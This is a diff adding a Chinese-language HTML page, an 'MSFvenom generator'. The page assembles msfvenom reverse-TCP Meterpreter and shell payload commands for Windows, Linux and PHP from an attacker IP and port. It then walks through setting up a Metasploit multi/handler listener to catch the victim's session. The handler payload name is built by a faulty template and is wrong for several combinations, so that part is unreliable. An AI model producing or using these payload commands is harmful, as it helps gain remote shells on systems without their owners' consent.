@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 MSFvenom 生成器</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+</head>
+<body class="bg-light">
+<div class="container mt-5">
+    <h2 class="text-center">💀 MSFvenom 生成器 💀</h2>
+
+    <form id="payloadForm" class="mt-4">
+        <div class="mb-3">
+            <label class="form-label">选择操作系统:</label>
+            <select id="osType" class="form-select">
+                <option value="windows">Windows</option>
+                <option value="linux">Linux</option>
+                <option value="mac">MacOS</option>
+                <option value="python">Python</option>
+                <option value="bash">Bash</option>
+                <option value="php">PHP</option>
+            </select>
+        </div>
+
+        <div class="mb-3">
+            <label class="form-label">选择架构:</label>
+            <select id="arch" class="form-select">
+                <option value="x86">x86 (32-bit)</option>
+                <option value="x64">x64 (64-bit)</option>
+                <option value="arm">ARM</option>
+                <option value="generic">通用</option>
+            </select>
+        </div>
+
+        <div class="mb-3">
+            <label class="form-label">选择 Payload 类型:</label>
+            <select id="payloadType" class="form-select">
+                <option value="meterpreter">Meterpreter</option>
+                <option value="shell">Shell</option>
+            </select>
+        </div>
+
+        <div class="mb-3">
+            <label class="form-label">LHOST (你的IP地址):</label>
+            <input type="text" id="lhost" class="form-control" required>
+        </div>
+
+        <div class="mb-3">
+            <label class="form-label">LPORT (监听端口):</label>
+            <input type="text" id="lport" class="form-control" required>
+        </div>
+
+        <button type="button" class="btn btn-danger w-100" onclick="generatePayload()">生成 Payload</button>
+    </form>
+
+    <div class="mt-4" id="result" style="display: none;">
+        <h4>🎯 生成的 Payload 命令:</h4>
+        <pre class="bg-dark text-white p-3" id="payloadCmd"></pre>
+
+        <h4>🔥 如何在 MSFconsole 获取 Shell</h4>
+        <ol>
+            <li>打开终端，输入以下命令启动 <b>Metasploit Framework</b>：</li>
+            <pre class="bg-dark text-white p-2">msfconsole</pre>
+
+            <li>在 Metasploit 控制台中，使用以下命令设置监听器：</li>
+            <pre class="bg-dark text-white p-2" id="msfCmd"></pre>
+
+            <li>等待目标设备运行 Payload，你应该会看到以下信息：</li>
+            <pre class="bg-dark text-white p-2">
+[*] Started reverse TCP handler on LHOST:LPORT
+[*] Meterpreter session 1 opened (LHOST:LPORT -> TARGET_IP:TARGET_PORT)
+            </pre>
+
+            <li>获取 Meterpreter shell（如果是 Meterpreter）：</li>
+            <pre class="bg-dark text-white p-2">sessions -i 1</pre>
+
+            <li>如果是普通 Shell，直接输入：</li>
+            <pre class="bg-dark text-white p-2">shell</pre>
+        </ol>
+    </div>
+</div>
+
+<script>
+function generatePayload() {
+    const osType = document.getElementById("osType").value;
+    const arch = document.getElementById("arch").value;
+    const payloadType = document.getElementById("payloadType").value;
+    const lhost = document.getElementById("lhost").value;
+    const lport = document.getElementById("lport").value;
+
+    const payloads = {
+        "windows": {
+            "x86": {
+                "meterpreter": `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > shell.exe`,
+                "shell": `msfvenom -p windows/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > shell.exe`
+            },
+            "x64": {
+                "meterpreter": `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > shell.exe`,
+                "shell": `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > shell.exe`
+            }
+        },
+        "linux": {
+            "x64": {
+                "meterpreter": `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf > shell.elf`,
+                "shell": `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf > shell.elf`
+            }
+        },
+        "php": {
+            "generic": {
+                "meterpreter": `msfvenom -p php/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw > shell.php`,
+                "shell": `msfvenom -p php/reverse_php LHOST=${lhost} LPORT=${lport} -f raw > shell.php`
+            }
+        }
+    };
+
+    const msfPayload = `${osType}/${arch}/${payloadType}/reverse_tcp`;
+    const payloadCmd = payloads[osType]?.[arch]?.[payloadType] || "无效的组合";
+
+    document.getElementById("payloadCmd").textContent = payloadCmd;
+    document.getElementById("msfCmd").textContent = `
+use exploit/multi/handler
+set payload ${msfPayload}
+set LHOST ${lhost}
+set LPORT ${lport}
+run
+    `;
+    document.getElementById("result").style.display = "block";
+}
+</script>
+</body>
+</html>
+
